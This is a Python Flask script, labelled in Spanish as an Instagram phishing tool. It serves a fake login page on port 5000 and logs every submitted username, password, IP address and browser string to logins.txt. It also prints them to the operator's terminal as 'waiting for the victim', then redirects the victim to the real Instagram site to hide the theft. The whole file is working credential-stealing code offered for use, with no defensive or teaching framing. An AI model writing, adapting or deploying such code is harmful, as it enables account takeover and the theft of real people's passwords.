from flask import Flask, render_template, request, redirect
import datetime
import os

app = Flask(__name__)

def mostrar_menu_instagram():
    os.system("cls" if os.name == "nt" else "clear")
    os.system("title PHISHING INSTAGRAM - FLASK")
    print("\n")
    print("             ╔═══════════════════════════════════════════════╗")
    print("             ║                                               ║")
    print("             ║             [ PHISHING INSTAGRAM ]            ║")
    print("             ║                                               ║")
    print("             ╠═══════════════════════════════════════════════╣")
    print("             ║  Estado:    ESPERANDO A LA VÍCTIMA...         ║")
    print("             ║  Puerto:    5000                              ║")
    print("             ║  Log file:  logins.txt                        ║")
    print("             ╚═══════════════════════════════════════════════╝\n")

mostrar_menu_instagram()

def mostrar_datos_terminal(fecha, usuario, clave, ip, agente):
    ancho = 70
    print("             ╔" + "═" * ancho + "╗")
    print("             ║{:^{width}}║".format("NUEVO INICIO DE SESIÓN", width=ancho))
    print("             ╠" + "═" * ancho + "╣")
    print("             ║  🕒 Fecha       : {:<{w}}║".format(fecha, w=ancho - 20))
    print("             ║  👤 Usuario     : {:<{w}}║".format(usuario, w=ancho - 20))
    print("             ║  🔑 Contraseña  : {:<{w}}║".format(clave, w=ancho - 20))
    print("             ║  🌐 IP          : {:<{w}}║".format(ip, w=ancho - 20))
    print("             ║  🧭 User-Agent  : {:<{w}}║".format(agente[:ancho - 21], w=ancho - 20))
    print("             ╚" + "═" * ancho + "╝\n")

@app.route('/', methods=['GET', 'POST'])
def index():
    error = None

    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        ip = request.remote_addr or "Desconocida"
        agente = request.user_agent.string or "Desconocido"

        with open("logins.txt", "a", encoding="utf-8") as file:
            file.write(f"[{timestamp}] Usuario: {username} | Contraseña: {password} | IP: {ip} | Navegador: {agente}\n")

        mostrar_datos_terminal(timestamp, username, password, ip, agente)

        # Redirigir al Instagram real después de enviar el formulario
        return redirect("https://www.instagram.com")

    return render_template("index.html", error=error)

if __name__ == '__main__':
    app.run(port=5000)
